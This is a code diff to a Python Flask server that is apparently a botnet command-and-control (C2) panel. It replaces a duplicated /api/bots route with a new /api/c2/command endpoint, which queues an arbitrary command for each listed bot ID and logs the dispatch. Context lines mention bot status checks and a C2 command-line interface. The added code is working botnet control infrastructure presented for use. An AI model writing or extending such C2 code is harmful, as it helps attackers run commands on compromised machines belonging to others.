@@ -149,9 +149,24 @@ def check_bot_statuses():
 def get_bots():
     return jsonify(bots)
 
-@app.route('/api/bots')
-def get_bots():
-    return jsonify(bots)
+@app.route('/api/c2/command', methods=['POST'])
+def issue_c2_command():
+    data = request.json
+    targets = data.get('targets', [])
+    command = data.get('command')
+
+    if not targets or not command:
+        return jsonify({'status': 'error', 'message': 'Missing targets or command'}), 400
+
+    command_obj = {'type': 'command', 'command': command, 'command_id': random.randint(1000, 9999)}
+
+    for bot_id in targets:
+        if bot_id not in commands:
+            commands[bot_id] = []
+        commands[bot_id].append(command_obj)
+    
+    logger.info(f"Issued command '{command}' to bots: {targets}")
+    return jsonify({'status': 'ok'})
 
 # --- C2 CLI ---
 def print_bots():
